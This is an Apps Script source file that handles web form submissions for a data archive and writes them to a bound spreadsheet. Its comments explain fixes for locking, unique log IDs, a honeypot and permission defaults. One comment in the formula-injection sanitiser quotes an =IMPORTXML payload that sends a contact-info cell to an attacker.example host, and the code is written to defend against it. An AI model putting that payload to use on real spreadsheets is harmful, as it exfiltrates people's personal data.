/**
 * APS Cascadia — Submission Handler
 * Unit: 💾 Data Archive | Region 10 (🌲 Cascadia)
 *
 * Receives POSTs from index.html and writes them to the Cascadia Log.
 *
 * Changes from the previous version are marked [FIX] with rationale.
 * FIRST deployment: Extensions → Apps Script → paste → Deploy →
 *   New deployment → Web app → Execute as "Me", Access "Anyone".
 *   This issues a URL. Put it in index.html (const scriptURL).
 *
 * UPDATING afterward: Deploy → Manage deployments → pencil icon →
 *   Version: "New version" → Deploy. The URL stays the same, so index.html
 *   needs no change. Saving the editor alone does NOT update the live web
 *   app — the URL keeps serving the last deployed version.
 *
 * Note: "New deployment" creates a SEPARATE deployment with a DIFFERENT URL,
 *   and the old one keeps running old code. Use it only for the first deploy
 *   or when you deliberately want a second endpoint.
 *
 * The script writes to whichever spreadsheet it is BOUND to
 * (SpreadsheetApp.getActiveSpreadsheet). Opening Apps Script from the sheet
 * itself is what establishes that binding — a script bound to an old copy
 * will silently write into the old copy.
 */

// ---------------------------------------------------------------------------
// CONFIGURATION
// ---------------------------------------------------------------------------

/** Must match the log tab name exactly. Phase 5 of the migration renames tabs —
 *  if the rebuilt tab gets a different name, update this line. */
var SHEET_NAME = "APS_Cascadia_Log_v4.1";

/** Region prefix per Master Data Protocol. Cascadia = CAS. */
var LOG_ID_PREFIX = "CAS-";

/** Digits in the numeric portion of log_id. Kept at 5 to match existing rows
 *  (CAS-60951). Uniqueness is guaranteed by the collision check below, not by
 *  width — widening to 6 only reduces retries as the archive grows. */
var LOG_ID_DIGITS = 5;

/** Hidden field in index.html. Invisible to humans; bots fill it. */
var HONEYPOT_FIELD = "website_url";

/** Columns written by analysts during triage, never by the submission form.
 *  Anything listed here is forced blank regardless of what the POST contains,
 *  which stops a hand-crafted request from pre-seeding analyst judgments.
 *
 *  [FIX] New. Previously any header name could be set by the submitter.
 *
 *  Note: this is a denylist, not an allowlist, on purpose. New witness-facing
 *  form fields flow through automatically as long as the column header matches
 *  the form field name — that is what lets AL–AO (substrate_context,
 *  narrative_frame_witness, cultural_context, community_context) work with no
 *  change to this script. */
var ANALYST_ONLY_FIELDS = [
  "primary_type",
  "secondary_types",
  "substrate",
  "class_code",
  "narrative_frame",
  "cultural_frame_flag",
  "witness_configuration",
  "analyst_notes",
  "res_id",
  "setting_type",
  "env_weather",
  "env_noise",
  "obs_demeanor",
  "obs_delivery",
  "indigenous_territory"
];

/** Recognized values for permission_level. Anything else fails closed to
 *  PRIVATE_DATA so a malformed submission can never reach the public registry. */
var VALID_PERMISSION_LEVELS = ["PUBLISH_ANON", "PRIVATE_DATA"];
var DEFAULT_PERMISSION_LEVEL = "PRIVATE_DATA";

// ---------------------------------------------------------------------------
// MAIN HANDLER
// ---------------------------------------------------------------------------

function doPost(e) {

  // --- Honeypot -----------------------------------------------------------
  // [FIX] index.html documents this behavior; the script never implemented it.
  // Returns a fake success: an error response would teach the bot operator that
  // the trap exists. Checked before the lock so bot traffic costs nothing.
  if (e && e.parameter && e.parameter[HONEYPOT_FIELD]) {
    console.log("Honeypot triggered — submission discarded.");
    return jsonResponse({ result: "success" });
  }

  var lock = LockService.getScriptLock();

  // [FIX] tryLock() returns a boolean that was previously discarded, so
  // execution continued even when the lock was not acquired. Two concurrent
  // submissions could both read the same getLastRow() and the second would
  // overwrite the first — silent data loss.
  if (!lock.tryLock(10000)) {
    return jsonResponse({ result: "error", error: "Server busy, please retry." });
  }

  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_NAME);

    // [FIX] Explicit check. Previously a wrong SHEET_NAME threw an opaque
    // "cannot read property of null" with no indication of the real cause.
    if (!sheet) {
      return jsonResponse({
        result: "error",
        error: "Sheet tab '" + SHEET_NAME + "' not found."
      });
    }

    var headers  = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
    var nextRow  = sheet.getLastRow() + 1;
    var newLogId = generateUniqueLogId(sheet, headers);

    var newRow = headers.map(function (header) {

      // System-assigned fields
      if (header === "timestamp")         return new Date();
      if (header === "log_id")            return newLogId;
      if (header === "engagement_status") return "PENDING";

      // Analyst-only columns are never populated from a submission
      if (ANALYST_ONLY_FIELDS.indexOf(header) !== -1) return "";

      // permission_level fails closed to PRIVATE_DATA
      if (header === "permission_level") {
        return normalizePermissionLevel(e.parameter[header]);
      }

      // Everything else maps by header name. A column whose header matches a
      // form field name is populated automatically; unmatched columns stay blank.
      return sanitizeForSheet(e.parameter[header] || "");
    });

    sheet.getRange(nextRow, 1, 1, newRow.length).setValues([newRow]);

    return jsonResponse({ result: "success", row: nextRow, log_id: newLogId });

  } catch (err) {
    // [FIX] Was `catch (e)`, shadowing the event parameter — anything added to
    // this block that needed the submission data would have silently read the
    // Error object instead. Also, JSON.stringify(errorObject) yields "{}", so
    // every error response the old version returned was empty.
    console.error("Submission failed: " + err.message);
    return jsonResponse({ result: "error", error: err.message });

  } finally {
    lock.releaseLock();
  }
}

// ---------------------------------------------------------------------------
// HELPERS
// ---------------------------------------------------------------------------

/**
 * Generates a log_id that does not already exist in the sheet.
 *
 * [FIX] The previous generator was a bare Math.random() with no uniqueness
 * check. Across 90,000 possible values, collision probability reaches ~50% by
 * roughly 350 entries — and a duplicate log_id is invisible when it happens,
 * leaving two witnesses' cases indistinguishable in citations and registry links.
 *
 * Runs inside the script lock, so the read-then-write is atomic.
 */
function generateUniqueLogId(sheet, headers) {
  var idColIndex = headers.indexOf("log_id");
  if (idColIndex === -1) {
    throw new Error("No 'log_id' column found in the header row.");
  }

  var lastRow = sheet.getLastRow();
  var existing = {};

  if (lastRow > 1) {
    var values = sheet.getRange(2, idColIndex + 1, lastRow - 1, 1).getValues();
    for (var i = 0; i < values.length; i++) {
      var v = values[i][0];
      if (v) existing[String(v).trim()] = true;
    }
  }

  var min = Math.pow(10, LOG_ID_DIGITS - 1);
  var max = Math.pow(10, LOG_ID_DIGITS) - 1;

  for (var attempt = 0; attempt < 100; attempt++) {
    var candidate = LOG_ID_PREFIX +
      Math.floor(min + Math.random() * (max - min + 1));
    if (!existing[candidate]) return candidate;
  }

  // 100 consecutive collisions means the ID space is effectively exhausted.
  // Failing loudly is correct here — a duplicate primary key is worse than a
  // rejected submission, and the remedy is to raise LOG_ID_DIGITS.
  throw new Error(
    "Could not generate a unique log_id after 100 attempts. " +
    "Increase LOG_ID_DIGITS."
  );
}

/**
 * Neutralizes spreadsheet formula injection.
 *
 * [FIX] New. setValues() treats a leading "=" as a formula, so a narrative
 * beginning with =IMPORTXML("https://attacker.example/?d="&Y2, "//a") would make
 * the sheet fetch that URL with cell contents appended — and column Y is
 * contact_info. The request fires on recalculation, leaves no trace in the row,
 * and exfiltrates exactly the witness PII the privacy architecture exists to protect.
 *
 * A leading apostrophe forces text interpretation. It is not stored in the cell
 * value and does not appear in CSV exports or the registry.
 */
function sanitizeForSheet(value) {
  if (value === null || value === undefined) return "";
  var s = String(value);
  if (s.length === 0) return s;

  var first = s.charAt(0);
  if (first === "=" || first === "+" || first === "-" ||
      first === "@" || first === "\t" || first === "\r") {
    return "'" + s;
  }
  return s;
}

/**
 * Validates permission_level, failing closed.
 *
 * [FIX] New. Previously any string the POST contained was written verbatim.
 * A typo or malformed value left the field in a state the registry query might
 * or might not match. Defaulting to PRIVATE_DATA means an unrecognized value
 * can never result in accidental publication.
 */
function normalizePermissionLevel(value) {
  if (!value) return DEFAULT_PERMISSION_LEVEL;
  var v = String(value).trim().toUpperCase();
  return VALID_PERMISSION_LEVELS.indexOf(v) !== -1 ? v : DEFAULT_PERMISSION_LEVEL;
}

/** Consistent JSON response shape. */
function jsonResponse(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
